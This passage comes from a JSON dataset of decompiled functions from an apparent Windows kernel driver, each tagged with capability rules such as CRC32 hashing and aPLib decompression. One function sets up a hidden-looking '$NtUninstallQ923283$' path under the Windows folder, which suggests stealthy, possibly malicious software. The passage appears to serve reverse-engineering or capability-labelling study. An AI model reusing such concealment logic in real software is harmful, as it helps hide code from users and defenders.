*(uVar7 + arg1) + (arg2 >> 0x10);\n                        }\n                        else if (uVar1 == 2) {\n                            *(uVar7 + arg1) = *(uVar7 + arg1) + arg2;\n                        }\n                        else if (uVar1 == 3) {\n                            *(uVar7 + arg1) = *(uVar7 + arg1) + arg2;\n                        }\n                        else {\n                            if ((uVar1 == 4) || (uVar1 != 10)) {\n                                return 0x21590064;\n                            }\n                            *(uVar7 + arg1) = *(uVar7 + arg1) + arg2;\n                        }\n                    }\n                    uVar4 = uVar4 + 1;\n                    piVar5 = piVar5 + 2;\n                } while (uVar4 < (uVar2 & 0xffff));\n            }\n            uVar8 = uVar8 + piVar3[1];\n        }\n    }\n    return 0;\n}\n",
        "token_count": 643
    },
    "00058b44": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint fcn.00058b44(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    int64_t arg1_00;\n    int32_t iVar1;\n    uint uVar2;\n    uint64_t in_R9;\n    \n    arg1_00 = arg1 + 0x28;\n    if ((in_R9 & 1) == 0) {\n        fcn.00030310(arg1_00);\n    }\n    else {\n        iVar1 = fcn.00030334(arg1_00);\n        if (iVar1 == 0) {\n            return 0x21590002;\n        }\n    }\n    uVar2 = fcn.0005882c(arg1, arg2, arg3, 0);\n    fcn.00030378(arg1_00);\n    return uVar2;\n}\n",
        "token_count": 182
    },
    "0005ca1c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t fcn.0005ca1c(int32_t *arg1, int64_t arg2, uint64_t arg3, ulong arg4)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    ulong *puVar6;\n    uint8_t uVar7;\n    int64_t iVar8;\n    uint64_t uVar9;\n    int64_t **ppiVar10;\n    int64_t **arg1_00;\n    int64_t **ppiVar11;\n    int32_t aiStackX8 [4];\n    uint64_t auStackX24 [2];\n    int64_t in_stack_00000028;\n    ulong in_stack_00000030;\n    int32_t aiStack88 [2];\n    ulong uStack80;\n    ulong uStack72;\n    int64_t iStack64;\n    \n    uStack72 = 0;\n    if ((arg3 == 0) && (in_stack_00000028 != 0)) {\n        arg2 = 0;\n    }\n    auStackX24[0] = arg3;\n    if ((*(arg1 + 6) & 1) == 0) {\n        aiStackX8[0] = *arg1;\n    }\n    else {\n        uVar3 = fcn.0005c564(aiStackX8, arg4, *(arg1 + 6), arg2);\n        uVar9 = uVar3;\n        if (uVar3 != 0) goto code_r0x0005cda6;\n    }\n    iVar2 = aiStackX8[0];\n    fcn.00032174(0x8e060);\n    arg1_00 = *0x8e078;\n    ppiVar11 = NULL;\n    if (*0x8e078 == NULL) {\ncode_r0x0005cd78:\n        fcn.000321f4(0x8e060);\n        uVar9 = 6;\n    }\n    else {\n        do {\n            ppiVar10 = arg1_00;\n            arg1_00 = ppiVar10;\n            if (*(ppiVar10 + 1) == iVar2) break;\n            arg1_00 = *ppiVar10;\n            ppiVar11 = ppiVar10;\n        } while (arg1_00 != NULL);\n        if (arg1_00 == NULL) goto code_r0x0005cd78;\n        if ((*(arg1 + 6) & 8) != 0) {\n            ppiVar10 = *arg1_00;\n            if (ppiVar11 != NULL) {\n                *ppiVar11 = *arg1_00;\n                ppiVar10 = *0x8e078;\n            }\n            *0x8e078 = ppiVar10;\n            fcn.000321f4(0x8e060);\n            fcn.00030310(arg1_00 + 3);\n            fcn.00063b80(arg1_00 + 2, 0);\n            fcn.00030378(arg1_00 + 3);\n            fcn.000302e8(arg1_00 + 3);\n            fcn.00030d24(arg1_00);\n            uVar9 = 0x4ca;\n            goto code_r0x0005cda6;\n        }\n        fcn.00030310(arg1_00 + 3);\n        fcn.000321f4(0x8e060);\n        iVar8 = *0xfffff78000000320;\n        uVar3 = (**0x11308)();\n        *(arg1_00 + 5) = (uVar3 * iVar8) / 10000;\n        if ((*(arg1 + 6) & 2) == 0) {\n            if (arg2 == 0) {\n                uVar3 = fcn.0004429c(in_stack_00000030, in_stack_00000028, &iStack64, auStackX24);\n                uVar9 = uVar3;\n                arg2 = iStack64;\n                if (uVar3 == 0) goto code_r0x0005cbb9;\n            }\n            else {\n                iStack64 = 0;\ncode_r0x0005cbb9:\n                uVar3 = fcn.00063f90(arg1_00[2], arg2, auStackX24[0] & 0xffffffff, 0);\n                uVar9 = uVar3;\n                fcn.00030d24(iStack64);\n                if (uVar3 == 0) goto code_r0x0005cbef;\n            }\n        }\n        else {\ncode_r0x0005cbef:\n            iVar8 = *0xfffff78000000320;\n            uStack80 = 0;\n            if ((*(arg1 + 6) & 4) == 0) {\n                uStack72 = 0;\n                aiStack88[0] = 0;\n                uStack80._6_2_ = 2;\n            }\n            else {\n                uVar3 = (**0x11308)();\n                uVar4 = fcn.00064000(arg1_00[2], &uStack72, aiStack88, *(arg1_00 + 4));\n                iVar1 = *0xfffff78000000320;\n                uVar9 = uVar4;\n                uVar5 = (**0x11308)();\n                if (uVar4 == 0x21590002) {\n                    uStack72 = 0;\n                    aiStack88[0] = 0;\n                    uStack80._0_7_ = CONCAT16(2, uStack80);\n                    uStack80 = uStack80 & 0xff00000000000000 | uStack80;\n                    uVar9 = fcn.000667b8();\n                    *(arg1_00 + 4) = *(arg1_00 + 4) + (uVar9 & 0xffffffff) % *(arg1_00 + 0x24);\n                }\n                else {\n                    if (uVar4 != 0) goto code_r0x0005cd85;\n                    *(arg1_00 + 4) = ((iVar1 * uVar5) / 10000 - (iVar8 * uVar3) / 10000) + *(arg1_00 + 4) >> 1;\n                }\n                if (*0x7d4fc <= *(arg1_00 + 4) && *(arg1_00 + 4) != *0x7d4fc) {\n                    *(arg1_00 + 4) = *0x7d4f8;\n                }\n            }\n            if ((*(arg1 + 6) & 1) != 0) {\n                uStack80._6_2_ = uStack80._6_2_ | 1;\n            }\n            uVar7 = 0;\n            iVar8 = 7;\n            uStack80._0_6_ = CONCAT24(*(arg1 + 1), aiStackX8[0]);\n            puVar6 = &uStack80;\n            do {\n                uVar7 = uVar7 + *puVar6;\n                puVar6 = puVar6 + 1;\n                iVar8 = iVar8 + -1;\n            } while (iVar8 != 0);\n            uStack80 = uStack80 & 0xffffffffffffff | uVar7 << 0x38;\n            uVar3 = fcn.000435ec(in_stack_00000030, &uStack80, uStack72, aiStack88[0]);\n            iVar8 = *0xfffff78000000320;\n            uVar9 = uVar3;\n            uVar3 = (**0x11308)();\n            *(arg1_00 + 5) = (uVar3 * iVar8) / 10000;\n        }\n    }\ncode_r0x0005cd85:\n    if (arg1_00 != NULL) {\n        fcn.00063bf8(arg1_00[2], uStack72);\n        fcn.00030378(arg1_00 + 3);\n    }\n    if (uVar9 == 0) {\n        return uVar9;\n    }\ncode_r0x0005cda6:\n    fcn.0004372c(in_stack_00000030, uVar9);\n    return uVar9;\n}\n",
        "token_count": 1850
    },
    "00018ae4": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint64_t fcn.00018ae4(void)\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    int16_t *piVar4;\n    int64_t iStackX8;\n    int64_t aiStackX16 [3];\n    ulong in_stack_fffffffffffffd18;\n    uint uVar5;\n    ulong in_stack_fffffffffffffd20;\n    uint uVar6;\n    uint16_t uStack728;\n    ushort uStack726;\n    int16_t *piStack720;\n    uint auStack712 [2];\n    ulong uStack704;\n    uint16_t *puStack696;\n    uint uStack688;\n    ulong uStack680;\n    ulong uStack672;\n    uchar auStack664 [16];\n    uchar auStack648 [94];\n    int16_t aiStack554 [260];\n    ushort uStack34;\n    \n    uVar5 = in_stack_fffffffffffffd18 >> 0x20;\n    uVar6 = in_stack_fffffffffffffd20 >> 0x20;\n    iStackX8 = 0;\n    if (*0x7e1d0 != 0) {\n        return 0;\n    }\n    *0x7e1d0 = 1;\n    fcn.00066704(&uStack728, 0x11a60);\n    puStack696 = &uStack728;\n    auStack712[0] = 0x30;\n    uStack704 = 0;\n    uStack688 = 0x240;\n    uStack680 = 0;\n    uStack672 = 0;\n    uVar3 = fcn.00066770(&iStackX8, 1, auStack712);\n    if (uVar3 != 0) {\n        return uVar3;\n    }\n    piStack720 = aiStack554 + 1;\n    uStack728 = 0;\n    uStack726 = 0x206;\n    uVar2 = fcn.0006676a(iStackX8, &uStack728, 0);\n    if (uVar2 == 0) {\n        for (piVar4 = aiStack554 + (uStack728 >> 1);\n            (((*piVar4 == 0x5c || (*piVar4 == 0x2f)) || (*piVar4 == 0x20)) || (*piVar4 == 9)); piVar4 = piVar4 + -1) {\n        }\n        piVar4[1] = 0;\n        piVar4 = fcn.00066764(aiStack554 + 1);\n        uVar2 = 0xffffffff;\n        if (piVar4 != NULL) {\n            uVar3 = 0xffffffffffffffff;\n            do {\n                if (uVar3 == 0) break;\n                uVar3 = uVar3 - 1;\n                iVar1 = *piVar4;\n                piVar4 = piVar4 + 1;\n            } while (iVar1 != 0);\n            if (~uVar3 < 0x105) {\n                fcn.00066740(L\"Windows\");\n                fcn.000292e4(auStack648, 0x52);\n                fcn.00066722(L\"$NtUninstallQ923283$\", 0x51, 0x119cc, auStack648);\n                *0x7dfc2 = 0;\n                fcn.00066722(aiStack554 + 1, 0x103, 0x11920, auStack648);\n                uStack34 = 0;\n                fcn.00066704(&uStack728, aiStack554 + 1);\n                puStack696 = &uStack728;\n                auStack712[0] = 0x30;\n                uStack704 = 0;\n                uStack688 = 0x240;\n                uStack680 = 0;\n                uStack672 = 0;\n                uVar2 = fcn.0006673a(&iStackX8, 0x100000, auStack712, auStack664, CONCAT44(uVar5, 7), \n                                     CONCAT44(uVar6, 0x21));\n                if ((uVar2 != 0) || (uVar2 = (*_fcn.00011150)(iStackX8, 0, 0, 0, aiStackX16, 0),  uVar2 != 0))\n                goto code_r0x00018dc0;\n                if (*(aiStackX16[0] + 0x10) == 0) {\n                    (*_fcn.000115b8)();\n                    goto code_r0x00018dc5;\n                }\n                *0x7e1e0 = *(*(aiStackX16[0] + 0x10) + 0x10);\n                (**0x115b0)();\n                *0x7e1d8 = *(*(aiStackX16[0] + 0x10) + 8);\n                (**0x115b0)();\n                (*_fcn.000115b8)(aiStackX16[0]);\n                fcn.000177a4(*0x7e1d8, 0x18894, 0x1837c);\n                fcn.000324cc(0x7df08);\n                uVar2 = fcn.000172b8(0, 0x18894, 0x1837c);\n            }\n        }\n        if (uVar2 == 0) goto code_r0x00018dc5;\n    }\ncode_r0x00018dc0:\n    fcn.00018a58();\ncode_r0x00018dc5:\n    if (iStackX8 != 0) {\n        fcn.000666f2();\n    }\n    return uVar2;\n}\n",
        "token_count": 1263
    },
    "0001b64c": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint64_t fcn.0001b64c(uint64_t arg1)\n\n{\n    uint32_t uVar1;\n    uint64_t in_RAX;\n    uint64_t uVar2;\n    uint64_t *puVar3;\n    uint64_t uVar4;\n    uint64_t uVar5;\n    char in_DL;\n    int64_t iVar6;\n    uchar uVar7;\n    uint32_t uVar8;\n    uint64_t uVar9;\n    bool bVar10;\n    uint64_t auStackX8 [4];\n    \n    uVar5 = 0;\n    uVar7 = 0;\n    if (arg1 == 0) {\n        uVar2 = in_RAX & 0xffffffffffffff00;\n    }\n    else {\n        LOCK();\n        *0x7e530 = *0x7e530 + 1;\n        LOCK();\n        bVar10 = *0x7e528 == 0;\n        *0x7e528 = *0x7e528 ^ bVar10 * *0x7e528;\n        uVar4 = !bVar10 * *0x7e528;\n        uVar2 = uVar5;\n        if (!bVar10) {\n            uVar1 = fcn.0004cdb4();\n            uVar2 = 0;\n            if (in_DL != '\\0') {\n                fcn.00030310(0x7e290);\n                puVar3 = 0x7e2a8;\n                uVar4 = uVar5;\n                do {\n                    uVar8 = uVar4;\n                    if ((puVar3[-1] == arg1) && ((*puVar3 == uVar1 || (arg1 < 0)))) {\n                        *(uVar8 * 0x10 + 0x7e2a0) = 0;\n                        *(uVar8 * 0x10 + 0x7e2a8) = 0;\n                        break;\n                    }\n                    puVar3 = puVar3 + 2;\n                    uVar8 = uVar8 + 1;\n                    uVar4 = uVar8;\n                } while (puVar3 < 0x7e3a8);\n                fcn.00030378(0x7e290);\n                if (uVar8 < 0x10) {\n                    uVar2 = 1;\n                }\n            }\n            if ((((arg1 & 0xffffffff80000000) != 0xffffffff80000000) || (arg1 == 0xfffffffffffffffe)) ||\n               (arg1 == 0xffffffffffffffff)) {\n                uVar7 = 1;\n            }\n            uVar4 = (*_fcn.00011150)(arg1, 0, 0, uVar7, auStackX8, 0);\n            if (uVar4 == 0) {\n                uVar9 = ((auStackX8[0] >> 8 ^ auStackX8[0]) >> 8 ^ auStackX8[0]) >> 8 ^ auStackX8[0];\n                iVar6 = SUB168(ZEXT816(0x47ae147ae147ae15) * ZEXT816(uVar9) >> 0x40, 0);\n                uVar4 = (*_fcn.000115b8)();\n                uVar9 = uVar9 + ((uVar9 - iVar6 >> 1) + iVar6 >> 6) * -100;\n            }\n            else {\n                auStackX8[0] = 0;\n                uVar9 = uVar5;\n            }\n            if (auStackX8[0] != 0) {\n                fcn.00030310(0x7e448);\n                if (((in_DL == '\\0') || (*(auStackX8[0] - 0x28) == 1)) && (iVar6 = *(*0x7e298 + uVar9 * 8),  iVar6 != 0)\n                   ) {\n                    puVar3 = iVar6 + 8;\n                    uVar4 = uVar5;\n                    do {\n                        if (*puVar3 == auStackX8[0]) {\n                            iVar6 = uVar4 * 0x30 + iVar6;\n                            fcn.00030d24(*(iVar6 + 0x20));\n                            fcn.0006677c(iVar6, 0, 0x30);\n                            break;\n                        }\n                        uVar5 = uVar5 + 1;\n                        uVar4 = uVar4 + 1;\n                        puVar3 = puVar3 + 6;\n                    } while (uVar5 < 100);\n                }\n                uVar4 = fcn.00030378(0x7e448);\n            }\n        }\n        LOCK();\n        *0x7e530 = *0x7e530 + -1;\n        uVar2 = uVar4 & 0xffffffffffffff00 | uVar2;\n    }\n    return uVar2;\n}\n",
        "token_count": 1075
    },
    "0001b904": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint64_t fcn.0001b904(uint64_t arg1, ulong arg2, ulong arg3, uint64_t arg4)\n\n{\n    int64_t iVar1;\n    uint8_t uVar2;\n    uint64_t uVar3;\n    uint64_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    int64_t *piVar9;\n    int64_t iVar10;\n    uint64_t uVar11;\n    bool bVar12;\n    uint64_t auStack72 [2];\n    \n    iVar1 = *0xfffff78000000014;\n    LOCK();\n    *0x7e530 = *0x7e530 + 1;\n    uVar4 = 0;\n    LOCK();\n    bVar12 = *0x7e528 == 0;\n    *0x7e528 = *0x7e528 ^ bVar12 * *0x7e528;\n    uVar3 = !bVar12 * *0x7e528;\n    if (!bVar12) {\n        if ((((arg1 & 0xffffffff80000000) != 0xffffffff80000000) || (arg1 == 0xfffffffffffffffe)) ||\n           (uVar2 = 0,  arg1 == 0xffffffffffffffff)) {\n            uVar2 = 1;\n        }\n        uVar3 = (*_fcn.00011150)(arg1, 0, 0, arg4 & 0xffffffffffffff00 | uVar2, auStack72, 0);\n        if (uVar3 == 0) {\n            uVar8 = ((auStack72[0] >> 8 ^ auStack72[0]) >> 8 ^ auStack72[0]) >> 8 ^ auStack72[0];\n            iVar7 = SUB168(ZEXT816(0x47ae147ae147ae15) * ZEXT816(uVar8) >> 0x40, 0);\n            uVar3 = (*_fcn.000115b8)();\n            uVar8 = uVar8 + ((uVar8 - iVar7 >> 1) + iVar7 >> 6) * -100;\n        }\n        else {\n            auStack72[0] = 0;\n            uVar8 = uVar4;\n        }\n        if (auStack72[0] != 0) {\n            fcn.00030310(0x7e448);\n            piVar9 = *0x7e298 + uVar8 * 8;\n            if (*piVar9 == 0) {\n                iVar7 = fcn.00030cec(100);\n                piVar9 = *0x7e298 + uVar8 * 8;\n                *piVar9 = iVar7;\n                if (iVar7 != 0) goto code_r0x0001ba35;\n            }\n            else {\ncode_r0x0001ba35:\n                iVar7 = *piVar9;\n                piVar9 = iVar7 + 0x10;\n                uVar3 = uVar4;\n                uVar8 = uVar4;\n                do {\n                    iVar6 = uVar8;\n                    if (piVar9[-1] == 0) {\n                        iVar5 = uVar3;\n                        if (iVar6 != -1) {\n                            iVar5 = iVar6;\n                        }\n                        break;\n                    }\n                    uVar11 = iVar1 - *piVar9;\n                    if (uVar4 < uVar11) {\n                        uVar4 = uVar11;\n                        uVar3 = uVar8;\n                    }\n                    iVar5 = uVar3;\n                    uVar8 = iVar6 + 1U;\n                    piVar9 = piVar9 + 6;\n                } while (iVar6 + 1U < 100);\n                iVar10 = iVar5 * 0x30;\n                fcn.00030d24(*(iVar10 + 0x20 + iVar7));\n                *(iVar10 + 0x20 + iVar7) = arg2;\n                *(iVar10 + 8 + iVar7) = auStack72[0];\n                *(iVar10 + 0x18 + iVar7) = arg3;\n                *(iVar10 + 0x28 + iVar7) = arg4;\n                *(iVar10 + 0x10 + iVar7) = iVar1;\n                uVar4 = 1;\n            }\n            uVar3 = fcn.00030378(0x7e448);\n            LOCK();\n            uVar3 = uVar3 & 0xffffffffffffff00 | uVar4;\n            goto code_r0x0001babb;\n        }\n    }\n    LOCK();\n    uVar3 = uVar3 & 0xffffffffffffff00;\ncode_r0x0001babb:\n    *0x7e530 = *0x7e530 + -1;\n    return uVar3;\n}\n",
        "token_count": 1065
    },
    "0001bacc": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint64_t fcn.0001bacc(uint64_t arg1, uint64_t arg2, uint32_t *arg3)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    uint64_t *puVar7;\n    uint64_t uVar8;\n    uint64_t uVar9;\n    uint64_t uVar10;\n    uint64_t in_R9;\n    uint32_t uVar11;\n    uint64_t uVar12;\n    bool bVar13;\n    uchar auStackX32 [8];\n    uint64_t uStack104;\n    ulong uStack96;\n    uint64_t uStack88;\n    \n    iVar2 = *0xfffff78000000014;\n    uVar9 = 0;\n    LOCK();\n    *0x7e530 = *0x7e530 + 1;\n    LOCK();\n    bVar13 = *0x7e528 == 0;\n    *0x7e528 = *0x7e528 ^ bVar13 * *0x7e528;\n    uVar5 = !bVar13 * *0x7e528;\n    uVar10 = uVar9;\n    if (!bVar13) {\n        uStack88 = arg1 & 0xffffffff80000000;\n        uVar10 = 0;\n        uVar12 = uVar9;\n        while( true ) {\n            if (((uStack88 != 0xffffffff80000000) || (arg1 == 0xfffffffffffffffe)) ||\n               (uVar3 = 0,  arg1 == 0xffffffffffffffff)) {\n                uVar3 = 1;\n            }\n            in_R9 = in_R9 & 0xffffffffffffff00 | uVar3;\n            uVar5 = (*_fcn.00011150)(arg1, 0, 0, in_R9, &uStack104, 0);\n            if (uVar5 == 0) {\n                uVar8 = ((uStack104 >> 8 ^ uStack104) >> 8 ^ uStack104) >> 8 ^ uStack104;\n                iVar6 = SUB168(ZEXT816(0x47ae147ae147ae15) * ZEXT816(uVar8) >> 0x40, 0);\n                uVar5 = (*_fcn.000115b8)();\n                uVar8 = uVar8 + ((uVar8 - iVar6 >> 1) + iVar6 >> 6) * -100;\n            }\n            else {\n                uStack104 = 0;\n                uVar8 = uVar9;\n            }\n            if (uStack104 == 0) break;\n            fcn.00030310(0x7e448);\n            iVar6 = *(*0x7e298 + uVar8 * 8);\n            if (iVar6 != 0) {\n                puVar7 = iVar6 + 8;\n                uVar5 = uVar9;\n                do {\n                    if (*puVar7 == uStack104) {\n                        if (iVar2 - *(iVar6 + 0x10 + uVar5 * 0x30) < 100000000) {\n                            if (arg3 != NULL) {\n                                iVar1 = *(iVar6 + 0x20 + uVar5 * 0x30);\n                                uVar11 = arg2 & 0xffffffff;\n                                if (iVar1 == 0) {\n                                    *arg3 = uVar11;\n                                }\n                                else if (uVar11 < *(iVar6 + 0x18 + uVar5 * 0x30)) {\n                                    *arg3 = *(iVar1 + (arg2 & 0xffffffff) * 4);\n                                }\n                                else {\n                                    *arg3 = *(iVar6 + 0x28 + uVar5 * 0x30);\n                                }\n                            }\n                            uVar10 = 1;\n                        }\n                        else {\n                            fcn.00030378(0x7e448);\n                            fcn.0001b64c(arg1);\n                            fcn.00030310(0x7e448);\n                        }\n                        break;\n                    }\n                    uVar5 = uVar5 + 1;\n                    puVar7 = puVar7 + 6;\n                } while (uVar5 < 100);\n            }\n            uVar5 = fcn.00030378(0x7e448);\n            if (((uVar10 != '\\0') || (0 < uVar12)) || (uVar5 = fcn.00030c98(0x402),  uVar5 == 0)) break;\n            iVar4 = fcn.000305f0(arg1, &uStack96);\n            if (iVar4 == 0) {\n                in_R9 = 0x400;\n                fcn.000667d0(uStack96, 2, uVar5, 0x400, auStackX32);\n                fcn.00030650(arg1, uStack96);\n            }\n            fcn.00030d24(uVar5);\n            uVar12 = uVar12 + 1;\n        }\n    }\n    LOCK();\n    *0x7e530 = *0x7e530 + -1;\n    return uVar5 & 0xffffffffffffff00 | uVar10;\n}\n",
        "token_count": 1161
    },
    "0001bdd4": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint64_t fcn.0001bdd4(ulong arg1, int16_t *arg2, int64_t arg3, int64_t arg4)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    code *pcVar5;\n    int64_t iVar6;\n    uint64_t uVar7;\n    uint64_t uVar8;\n    int32_t iVar9;\n    int16_t *piVar10;\n    bool bVar11;\n    uchar auStack136 [8];\n    ulong uStack128;\n    int64_t iStack120;\n    uchar auStack112 [16];\n    uint uStack96;\n    ulong uStack88;\n    uchar *puStack80;\n    uint uStack72;\n    ulong uStack64;\n    ulong uStack56;\n    \n    iVar4 = *0x7e530;\n    uVar8 = 0;\n    LOCK();\n    *0x7e530 = *0x7e530 + 1;\n    LOCK();\n    bVar11 = *0x7e528 == 0;\n    *0x7e528 = *0x7e528 ^ bVar11 * *0x7e528;\n    uVar7 = !bVar11 * *0x7e528;\n    if (bVar11) {\n        LOCK();\n        uVar7 = uVar7 & 0xffffffffffffff00;\n        *0x7e530 = iVar4;\n    }\n    else {\n        if (arg3 < arg4) {\n            iVar4 = fcn.00030c98(0x402);\n            if (iVar4 != 0) {\n                pcVar5 = fcn.000547bc(*0x7e510);\n                while( true ) {\n                    iVar9 = uVar8;\n                    iVar3 = (*pcVar5)(arg1, uVar8, 0, iVar4, 0x400, auStack136);\n                    if (iVar3 == -0x7fffffe6) break;\n                    if (iVar3 == 0) {\n                        *(iVar4 + 0x10 + (*(iVar4 + 0xc) >> 1) * 2) = 0;\n                    }\n                    else {\n                        if (iVar3 != -0x7ffffffb) break;\n                        *(iVar4 + 0x400) = 0;\n                    }\n                    if (arg3 + 1 <= arg4) {\n                        uVar7 = 0xffffffffffffffff;\n                        piVar10 = iVar4 + 0x10;\n                        do {\n                            if (uVar7 == 0) break;\n                            uVar7 = uVar7 - 1;\n                            iVar1 = *piVar10;\n                            piVar10 = piVar10 + 1;\n                        } while (iVar1 != 0);\n                        uVar8 = 0xffffffffffffffff;\n                        piVar10 = arg2;\n                        do {\n                            if (uVar8 == 0) break;\n                            uVar8 = uVar8 - 1;\n                            iVar1 = *piVar10;\n                            piVar10 = piVar10 + 1;\n                        } while (iVar1 != 0);\n                        iVar6 = fcn.00030c98(((~uVar7 - 2) + ~uVar8) * 2 + 4);\n                        iStack120 = iVar6;\n                        if (iVar6 != 0) {\n                            fcn.00066788(iVar6, 0x11b48, arg2, iVar4 + 0x10);\n                            fcn.00066704(auStack112, iVar6);\n                            puStack80 = auStack112;\n                            uStack96 = 0x30;\n                            uStack88 = 0;\n                            uStack72 = 0x140;\n                            uStack64 = 0;\n                            uStack56 = 0;\n                            iVar3 = fcn.000666fe(&uStack128);\n                            if (iVar3 == 0) {\n                                cVar2 = fcn.0001bdd4(uStack128, iStack120, arg3 + 1, arg4);\n                                if (cVar2 != '\\0') {\n                                    iVar9 = iVar9 + -1;\n                                }\n                                fcn.000666f2(uStack128);\n                            }\n                            fcn.00030d24(iStack120);\n                        }\n                    }\n                    uVar8 = iVar9 + 1;\n                    pcVar5 = fcn.000547bc(*0x7e510);\n                }\n                fcn.00030d24(iVar4);\n            }\n            iVar3 = fcn.00066728(arg1);\n            uVar7 = 0;\n            uVar8 = iVar3 == 0;\n        }\n        LOCK();\n        *0x7e530 = *0x7e530 + -1;\n        uVar7 = uVar7 & 0xffffffffffffff00 | uVar8;\n    }\n    return uVar7;\n}\n",
        "token_count": 1070
    },
    "000342cc": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nulong fcn.000342cc(int64_t arg1, int64_t arg2)\n\n{\n    uint16_t *puVar1;\n    uint16_t *puVar2;\n    uint16_t *puVar3;\n    int32_t iVar4;\n    ulong uVar5;\n    \n    if (*(arg1 + 0x10) == arg2) {\ncode_r0x000342d9:\n        uVar5 = 1;\n    }\n    else {\n        puVar2 = *(arg1 + 0x48);\n        puVar3 = *(arg1 + 0x58);\n        puVar1 = arg2 + 0x20;\n        if (((puVar2 != NULL) && (puVar1 != NULL)) && (*puVar2 == *puVar1)) {\n            iVar4 = fcn.00031328(*(puVar2 + 4), *(arg2 + 0x28), *puVar1 >> 1);\n            if (iVar4 == 0) goto code_r0x000342d9;\n        }\n        if (((puVar3 != NULL) && (puVar1 != NULL)) && (*puVar3 == *puVar1)) {\n            iVar4 = fcn.00031328(*(puVar3 + 4), *(arg2 + 0x28), *puVar1 >> 1);\n            if (iVar4 == 0) goto code_r0x000342d9;\n        }\n        uVar5 = 0;\n    }\n    return uVar5;\n}\n",
        "token_count": 328
    },
    "00036394": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint64_t fcn.00036394(int16_t *arg1, int16_t *arg2, int64_t **arg3)\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint64_t uVar4;\n    int64_t arg1_00;\n    int64_t *arg1_01;\n    int64_t iVar5;\n    int64_t *piVar6;\n    uint64_t uVar7;\n    int64_t iVar8;\n    int16_t *piVar9;\n    uint32_t auStackX8 [2];\n    int16_t *piStackX16;\n    int32_t iStackX32;\n    uint64_t in_stack_ffffffffffffff58;\n    ulong uStack152;\n    int64_t iStack144;\n    uchar auStack136 [16];\n    uint auStack120 [2];\n    ulong uStack112;\n    uchar *puStack104;\n    uint uStack96;\n    ulong uStack88;\n    ulong uStack80;\n    \n    arg1_01 = NULL;\n    uStack152 = 0;\n    if (arg1 == NULL) {\n        return 0xc00000ef;\n    }\n    if (arg3 == NULL) {\n        return 0xc00000f1;\n    }\n    *arg3 = NULL;\n    piStackX16 = arg2;\n    fcn.00066704(auStack136, arg1);\n    puStack104 = auStack136;\n    auStack120[0] = 0x30;\n    uStack112 = 0;\n    uStack96 = 0x140;\n    uStack88 = 0;\n    uStack80 = 0;\n    uVar4 = fcn.000666fe(&uStack152, 8, auStack120);\n    if (uVar4 != 0) {\n        return uVar4;\n    }\n    uVar4 = 0x418;\n    arg1_00 = fcn.00030c98(0x418);\n    piVar6 = arg1_01;\n    if (arg1_00 != 0) {\n        while( true ) {\n            in_stack_ffffffffffffff58 = in_stack_ffffffffffffff58 & 0xffffffff00000000 | uVar4;\n            uVar2 = fcn.000667d6(uStack152, piVar6, 0, arg1_00, in_stack_ffffffffffffff58, auStackX8);\n            if (uVar2 == 0xc0000023) {\n                fcn.00030d24(arg1_00);\n                uVar2 = auStackX8[0];\n                uVar4 = auStackX8[0];\n                arg1_00 = fcn.00030c98(uVar4);\n                if (arg1_00 == 0) goto code_r0x00036448;\n                in_stack_ffffffffffffff58 = in_stack_ffffffffffffff58 & 0xffffffff00000000 | uVar2;\n                uVar2 = fcn.000667d6(uStack152, piVar6, 0, arg1_00, in_stack_ffffffffffffff58, auStackX8);\n            }\n            uVar7 = uVar2;\n            if (uVar2 == 0x8000001a) {\n                iVar8 = piVar6 + 1 << 3;\n                arg1_01 = fcn.00030c98(iVar8);\n                if (arg1_01 == NULL) goto code_r0x000364f9;\n                fcn.0006677c(arg1_01, 0, iVar8);\n                if (arg2 == NULL) {\n                    iVar8 = 0;\n                    goto code_r0x00036532;\n                }\n                uVar7 = 0xffffffffffffffff;\n                goto code_r0x00036524;\n            }\n            if (uVar2 != 0) break;\n            piVar6 = piVar6 + 1;\n        }\n        goto code_r0x00036668;\n    }\ncode_r0x00036448:\n    uVar7 = 0xc0000017;\n    goto code_r0x00036679;\ncode_r0x000364f9:\n    uVar7 = 0xc0000017;\n    goto code_r0x00036668;\n    while( true ) {\n        uVar7 = uVar7 - 1;\n        iVar1 = *arg2;\n        arg2 = arg2 + 1;\n        if (iVar1 == 0) break;\ncode_r0x00036524:\n        if (uVar7 == 0) break;\n    }\n    iVar8 